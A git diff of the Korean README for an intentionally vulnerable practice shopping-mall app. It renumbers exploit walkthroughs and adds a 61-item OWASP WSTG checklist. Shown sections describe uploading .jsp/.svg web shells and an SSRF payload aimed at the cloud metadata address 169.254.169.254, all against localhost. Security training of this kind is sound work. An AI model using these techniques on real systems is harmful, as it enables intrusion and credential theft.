@@ -1505,7 +1728,10 @@ curl -s http://localhost:8080/api/inquiries/2 \
 
 ---
 
-## 58. 1:1 고객지원 헬프데스크 무제한 파일 업로드 (TICKET_FILE_UPLOAD)
+---
+
+## 59. Unrestricted File Upload on Support Tickets (TICKET_FILE_UPLOAD)
+
 **WSTG-INPV-12** | 엔드포인트: `POST /api/inquiries/upload`
 
 증빙 파일 업로드 시 확장자 검증 부재로 `.jsp`, `.html`, `.svg` 웹쉘 및 악성 스크립트를 서버에 업로드합니다.
@@ -1519,7 +1745,10 @@ rm -f shell.jsp
 
 ---
 
-## 59. 재고 초과 판매 레이스 컨디션 (STOCK_RACE_CONDITION)
+---
+
+## 60. Inventory Overselling Concurrency Race Condition (STOCK_RACE_CONDITION)
+
 **WSTG-BUSL-04** | 엔드포인트: `POST /api/orders`
 
 재고가 1개 남은 상품에 대해 마이크로초 단위로 동시 다중 결제 요청을 전송하여 DB Lock 부재로 음수 재고 초과 판매(Overselling)를 유발합니다.
@@ -1541,7 +1770,10 @@ wait
 
 ---
 
-## 60. 재입고 알림 콜백 Webhook SSRF (RESTOCK_WEBHOOK_SSRF)
+---
+
+## 61. Restock Notification Callback SSRF (RESTOCK_WEBHOOK_SSRF)
+
 **WSTG-INPV-19** | 엔드포인트: `POST /api/products/{id}/notify-restock`
 
 품절 상품 재입고 알림 신청 시 Webhook URL에 내부 루프백(`http://127.0.0.1:8080/api/admin/metrics`) 또는 클라우드 메타데이터(`169.254.169.254`)를 입력하여 내부망 정보를 반환받습니다.
@@ -1556,7 +1788,10 @@ curl -s -X POST http://localhost:8080/api/products/10/notify-restock \
 
 ---
 
-## 61. 전자 영수증 원장 조회 및 인쇄 (RECEIPT_EXPORT)
+---
+
+## [부록] 전자 세금계산서 / 거래명세서 원장 및 인쇄 레이아웃 검증 (RECEIPT_EXPORT)
+
 **엔드포인트**: `GET /api/orders/{id}/receipt`
 
 주문별 전자 세금계산서/거래명세서 원장 데이터, 품목별 공급가액, 부가세(10%), 전자서명 및 직인을 확인합니다.
@@ -1591,3 +1826,29 @@ H2 인메모리 DB를 사용하므로 서버를 재시작하거나 스코어보�
 java -jar target/vuln-mall-backend-1.0.0.jar --spring.profiles.active=h2
 ```
 
+
+---
+
+## 검증 체크리스트 (총 61개 취약점 완비)
+
+| 단계 | 대상 도메인 | 포함 취약점 수 | 상태 |
+|:---:|:---|:---:|:---:|
+| 1 | 데이터 검증 및 인젝션 (WSTG-INPV: SQLi, XSS, Path Traversal, XXE, SSTI, Cmd, ZipSlip, FileUpload) | 17개 | 완료 |
+| 2 | 암호화 결함 (WSTG-CRYP: AES-ECB Block Shuffling, Predictable Reset Token) | 2개 | 완료 |
+| 3 | 인증 및 인가 통제 (WSTG-ATHN & ATHZ: JWT Confusion, User Enum, Mass Assignment, BOLA, HPP, WAF Bypass) | 13개 | 완료 |
+| 4 | 세션 및 클라이언트 (WSTG-SESS & CLNT: CSRF, DOM XSS, Open Redirect, Roulette Client Tampering) | 5개 | 완료 |
+| 5 | 비즈니스 로직 결함 (WSTG-BUSL: Price/Points Tampering, Race Condition, Rounding, Workflow Bypass) | 14개 | 완료 |
+| 6 | 크로스사이트 스크립팅 (WSTG-INPV XSS: Stored XSS - Review, Inq, Address, Cart, Member, Refund, Wishlist) | 8개 | 완료 |
+| 7 | 서버 사이드 요청 위조 및 설정/노출 (SSRF, Restock Webhook SSRF, Config/Info Exposure) | 2개 | 완료 |
+| **합계** | **OWASP WSTG 기반 보안 결함 전체** | **총 61개** | **100% 완료** |
+
+---
+
+## 초기화 방법
+
+H2 인메모리 DB를 사용하므로 서버를 재시작하거나 스코어보드에서 '발견 기록 초기화' 버튼을 클릭하면 모든 취약점 상태가 `schema-h2.sql` 기준으로 초기화됩니다.
+
+```bash
+# 서버 재시작
+java -jar target/vuln-mall-backend-1.0.0.jar --spring.profiles.active=h2
+```
